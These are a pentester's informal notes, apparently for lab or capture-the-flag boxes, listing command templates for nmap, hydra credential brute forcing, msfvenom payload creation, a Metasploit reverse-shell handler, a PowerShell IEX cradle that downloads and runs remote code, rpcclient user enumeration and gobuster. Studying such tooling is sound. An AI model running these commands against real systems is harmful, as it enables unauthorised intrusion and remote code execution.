# Random notes that I have not filed yet

## Standard nmap scan
`sudo nmap -sC -sV -oA nmap/(box name) (IP)`

## Make nice screenshots of access
Windows: `hostname; whoami; ipconfig`

Linux: `hostname; whoami; ip a`

## Setup a simple web server
`python -m SimpleHTTPServer`

## Download from Windows shell
`IEX(New-Object Net.WebClient).downloadString('http://(IP/HOSTNAME)')`

## Encoding file to remove bad characters, and copy to clipboard
`cat (filename) | iconv -t UTF-16LE | base64 -w 0 | xclip -selection clipboard`

Change `UTF-16LE` to `UTF-8` for Unix

## HTTP login pages
`hydra -C /usr/share/seclists/Passwords/Default-Credentials/(chosen file) -s (port) (IP) http-get (subdirectory)`

## MSFVenom
### List payloads
`msfvenom -l payloads`

### List formats
`msfvenom -l formats`

### Create payload
`msfvenom -p (payload) LHOST=(IP) LPORT=(port) -f (format) -o (output filename)`

## Setup handler
In Metasploit: 

`use exploit/multi/handler`

`set payload (selected payload)`

`set LHOST tun0`

`set LPORT (port)`

`exploit -j` to run in background

## Check sessions in Metasploit
`sessions -i 1`

## RPC 
### Access
`rpcclient -U '' (IP)`
### User dump
In RPC client, run `enumdomusers`
### More details
In RPC client, run `querdispinfo`

## Wordlists
### How to make nice wordlists
`hashcat --force --stdout -r /usr/share/hashcat/rules/best64.rule (original password list you have) > password.lst`

## Decompilers
### DNSpy
Recommended for .NET

## Windows shell
### `allinfo`
Windows version of `ls -lah`
### `type`
Windows version of `cat`

## OS typing by TTL
Windows has a default of a 128 TTL, Unix has 64?

## Finding web server subdirectories
`gobuster dir -u '(IP)' -x (format) -w /usr/share/wordlists/dirbuster/(chosen wordlist) -o (output file)`
